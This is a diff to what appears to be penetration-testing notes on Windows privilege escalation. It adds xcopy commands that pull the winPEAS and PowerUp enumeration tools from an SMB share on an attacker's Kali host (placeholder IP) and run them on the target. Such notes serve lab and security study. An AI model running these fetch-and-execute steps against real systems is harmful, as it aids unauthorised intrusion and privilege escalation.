@@ -72,6 +72,14 @@ net use \\<Kali IP>\share
 copy \\<Kali IP>\share\winPEASany.exe .
 winPEASany.exe
 ```
+or
+```
+xcopy \\<Kali IP>\share\winPEASany.exe C:\Temp\winPEAS\
+
+cd C:\Temp\winPEAS
+C:\Temp\winPEAS\winPEASany.exe
+```
+
 
 ### PowerUp
 
@@ -109,6 +117,14 @@ copy \\<Kali IP>\share\PowerUp.ps1 .
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 ```
+or
+```
+xcopy \\<Kali IP>\share\PowerUp.ps1 C:\Temp\PowerUp\
+
+Import-Module C:\Temp\PowerUp\PowerUp.ps1
+Invoke-AllChecks
+```
+
 
 
 # Links
